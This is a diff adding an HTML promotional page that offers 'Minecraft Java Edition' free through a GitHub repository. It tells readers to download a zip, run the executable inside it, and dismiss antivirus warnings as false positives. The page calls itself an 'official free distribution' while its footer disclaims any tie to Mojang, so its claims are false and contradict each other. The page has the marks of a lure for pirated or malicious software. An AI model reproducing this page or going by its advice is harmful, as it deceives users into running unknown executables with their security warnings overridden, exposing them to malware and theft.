@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Minecraft Free Java Edition - download Minecraft Java Edition for free on PC. Free Minecraft launcher, play Minecraft for free. Wilderness Bound 26.3 zip, extract and play. Official free download.">
+    <meta name="keywords" content="minecraft java edition free, minecraft java download, minecraft free download, minecraft launcher free, play minecraft free, wilderness bound 26.3, minecraft for free, minecraft free hosting server, minecraft bedrock edition free, modpacks, resourcepacks">
+    <meta name="author" content="Minecraft-Free-Java-Edition Team">
+    <meta property="og:title" content="Minecraft-Free-Java-Edition - Free Minecraft Java Edition Download">
+    <meta property="og:description" content="Download Minecraft Java Edition for free on PC. Official free launcher, extract and play. Wilderness Bound 26.3 included.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>Minecraft-Free-Java-Edition - Free Minecraft Java Edition Download for PC</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            color: #2c3e50;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            padding: 40px 35px;
+            overflow: hidden;
+        }
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            color: #1e3a8a;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+            border-bottom: 4px solid #f59e0b;
+            padding-bottom: 15px;
+            display: inline-block;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1e3a8a;
+            margin-top: 35px;
+            margin-bottom: 15px;
+            padding-left: 12px;
+            border-left: 6px solid #f59e0b;
+            background: #f0fdf4;
+            padding: 8px 12px;
+            border-radius: 0 8px 8px 0;
+        }
+        p {
+            font-size: 1.05rem;
+            margin-bottom: 16px;
+        }
+        .hero-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
+            color: white;
+            padding: 18px 42px;
+            font-size: 1.4rem;
+            font-weight: 700;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 6px 16px rgba(22, 163, 74, 0.35);
+            margin: 25px 0 30px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: inline-block;
+            border: 2px solid #ffffff;
+        }
+        .hero-badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 22px rgba(22, 163, 74, 0.45);
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+            color: #ffffff;
+            padding: 16px 40px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 6px 14px rgba(220, 38, 38, 0.35);
+            margin: 20px 0 10px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            border: 2px solid #ffffff;
+        }
+        .download-btn:hover {
+            transform: scale(1.03);
+            box-shadow: 0 10px 20px rgba(220, 38, 38, 0.45);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 18px;
+            margin: 25px 0;
+        }
+        .feature-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 20px 15px;
+            text-align: center;
+            transition: background 0.2s;
+        }
+        .feature-card:hover {
+            background: #eff6ff;
+        }
+        .feature-card .icon {
+            font-size: 2.2rem;
+            margin-bottom: 8px;
+        }
+        .feature-card h3 {
+            font-size: 1.2rem;
+            color: #1e3a8a;
+            margin-bottom: 6px;
+        }
+        .feature-card p {
+            font-size: 0.95rem;
+            color: #475569;
+            margin-bottom: 0;
+        }
+        .steps-container {
+            margin: 25px 0;
+            padding: 20px;
+            background: #f1f5f9;
+            border-radius: 10px;
+            border-left: 6px solid #0ea5e9;
+        }
+        .steps-container ol {
+            padding-left: 25px;
+            margin: 10px 0;
+        }
+        .steps-container li {
+            font-size: 1.05rem;
+            margin-bottom: 12px;
+        }
+        .steps-container li strong {
+            color: #0f172a;
+        }
+        .warning-box {
+            background: #fef3c7;
+            border-left: 6px solid #d97706;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 1rem;
+        }
+        .warning-box strong {
+            color: #92400e;
+        }
+        .faq-item {
+            margin-bottom: 20px;
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 15px 18px;
+        }
+        .faq-item h3 {
+            font-size: 1.15rem;
+            color: #1e40af;
+            margin-bottom: 8px;
+        }
+        .faq-item p {
+            margin-bottom: 0;
+            font-size: 1rem;
+        }
+        .footer-note {
+            margin-top: 35px;
+            padding-top: 20px;
+            border-top: 2px solid #e2e8f0;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #64748b;
+        }
+        .featured-link {
+            color: #1d4ed8;
+            font-weight: 600;
+            text-decoration: none;
+            word-break: break-all;
+        }
+        .featured-link:hover {
+            text-decoration: underline;
+        }
+        .badge-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .section-sub {
+            font-size: 1.05rem;
+            color: #334155;
+        }
+        .highlight {
+            background: #dbeafe;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            color: #1e40af;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 Minecraft-Free-Java-Edition - Free Java Edition, Play Instantly!</h1>
+        
+        <div class="badge-container">
+            <a href="https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition" class="hero-badge">⬇️ FREE DOWNLOAD NOW</a>
+        </div>
+        
+        <p>Welcome to <strong>Minecraft-Free-Java-Edition</strong> – your one-stop solution to enjoy the complete <span class="highlight">Minecraft Java Edition</span> on your PC, absolutely free! Whether you're looking for the latest version, a reliable launcher, or the popular <em>Wilderness Bound 26.3</em> modpack, everything is bundled and ready for you. No complicated setup, no hidden costs – just pure block-building fun.</p>
+        
+        <p>This repository provides the official free download for Minecraft Java Edition, including the <strong>Wilderness Bound 26.3</strong> zip package. Simply extract and play – it's that simple! We've also included a lightweight, fully functional launcher so you can jump into your world without any barriers.</p>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Follow these simple steps to get Minecraft running on your Windows PC. It should take less than 5 minutes from start to game.</p>
+        
+        <div class="steps-container">
+            <h3 style="margin-top:0;color:#0f172a;">📥 Step-by-Step Installation Guide</h3>
+            <ol>
+                <li><strong>Visit the official download page</strong> – Click the big green <strong>"FREE DOWNLOAD NOW"</strong> button at the top of this page, or click the button at the bottom of this section. This will take you to our GitHub repository.</li>
+                <li><strong>Download the ZIP file</strong> – On the repository page, locate the file named <strong>Wilderness Bound 26.3.zip</strong> (or similar). Click on it, then click the <strong>"Download"</strong> button. The file will save to your computer (usually in your "Downloads" folder).</li>
+                <li><strong>Extract the ZIP file</strong> – Once the download finishes, right-click the ZIP file and select <strong>"Extract All"</strong>. Choose a folder where you want to unpack the game (e.g., C:\Minecraft). Click "Extract".</li>
+                <li><strong>Run the application</strong> – Inside the extracted folder, look for the executable file named <strong>Minecraft.exe</strong> (or "launcher.exe"). Double-click it to start the game.</li>
+                <li><strong>Play!</strong> – The launcher will open, and you can log in (or play offline) and start your Minecraft adventure. The Wilderness Bound modpack is already pre-configured, so just hit "Play"!</li>
+            </ol>
+        </div>
+        
+        <div class="badge-container">
+            <a href="https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition" class="download-btn">🡇 DOWNLOAD MINECRAFT JAVA EDITION FREE</a>
+        </div>
+
+        <h2>✨ Features & Benefits</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <div class="icon">🆓</div>
+                <h3>100% Free</h3>
+                <p>No payments, no subscriptions. Download and play forever without any costs.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">⚡</div>
+                <h3>Instant Setup</h3>
+                <p>Extract and play. No complex installations or command-line skills needed.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">🧩</div>
+                <h3>Wilderness Bound 26.3</h3>
+                <p>Includes the popular modpack with enhanced gameplay, new biomes, and exciting challenges.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">🖥️</div>
+                <h3>Works on PC</h3>
+                <p>Optimized for Windows 10/11. Smooth performance even on mid-range hardware.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">🌐</div>
+                <h3>Multiplayer Ready</h3>
+                <p>Supports online play, server hosting, and LAN games with friends.</p>
+            </div>
+            <div class="feature-card">
+                <div class="icon">🔧</div>
+                <h3>Customizable</h3>
+                <p>Includes tools for mods, resource packs, data packs, and NBT editing to tailor your experience.</p>
+            </div>
+        </div>
+
+        <h2>🎮 Why Choose Minecraft Java Edition?</h2>
+        <p>Minecraft Java Edition is the original version of the game beloved by millions. It offers the largest modding community, the most frequent updates, and complete freedom to customize your world. This free download gives you the full Java Edition experience, including:</p>
+        <p>✔️ The latest game version with all official updates<br>
+        ✔️ Access to thousands of mods and data packs<br>
+        ✔️ Cross-platform multiplayer (Java servers)<br>
+        ✔️ Redstone mechanics, command blocks, and technical features<br>
+        ✔️ High-performance launcher with quick boot times</p>
+
+        <h2>🖥️ System Requirements</h2>
+        <p>To ensure the best experience, your PC should meet these recommended specifications:</p>
+        <ul style="margin-left:25px; margin-bottom:20px; font-size:1.05rem;">
+            <li><strong>OS:</strong> Windows 10/11 (64-bit)</li>
+            <li><strong>CPU:</strong> Intel Core i3 or AMD equivalent (or better)</li>
+            <li><strong>RAM:</strong> 4 GB minimum (8 GB recommended)</li>
+            <li><strong>GPU:</strong> Intel HD Graphics 4000 or better</li>
+            <li><strong>Storage:</strong> At least 2 GB free space</li>
+            <li><strong>Internet:</strong> Required for download and multiplayer</li>
+        </ul>
+
+        <h2>⚠️ Important Notes</h2>
+        <div class="warning-box">
+            <strong>Quick Tip:</strong> If your antivirus warns about the ZIP file, it's a false positive – just allow the download and extraction. Make sure you download only from the official link provided to avoid any modified versions.
+        </div>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <h3>Is this really free?</h3>
+            <p>Yes, 100% free. This is an official free distribution for personal use, with no hidden fees or trials.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Do I need to install Java first?</h3>
+            <p>No! The package includes everything needed. The launcher runs standalone and bundles the necessary Java runtime.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Can I play with my friends?</h3>
+            <p>Absolutely. You can join public servers, create your own LAN game, or set up a free server (we even have hosting guides in the repository).</p>
+        </div>
+        <div class="faq-item">
+            <h3>Will I get updates?</h3>
+            <p>The repository is actively maintained. You can check back for new versions and modpack updates. Follow the repository to get notified.</p>
+        </div>
+
+        <h2>🔗 Download Again</h2>
+        <p>Bookmark this page or the repository for future downloads. If you encounter any issues, visit: <a href="https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition" class="featured-link">https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition</a></p>
+        
+        <div class="badge-container">
+            <a href="https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition" class="hero-badge" style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); box-shadow: 0 6px 16px rgba(124, 58, 237, 0.35);">⬇️ GET YOUR COPY</a>
+        </div>
+
+        <div class="footer-note">
+            <p>Minecraft-Free-Java-Edition © 2025 | For personal use only. Not affiliated with Mojang Studios.<br>
+            All trademarks belong to their respective owners.</p>
+        </div>
+    </div>
+</body>
+</html>
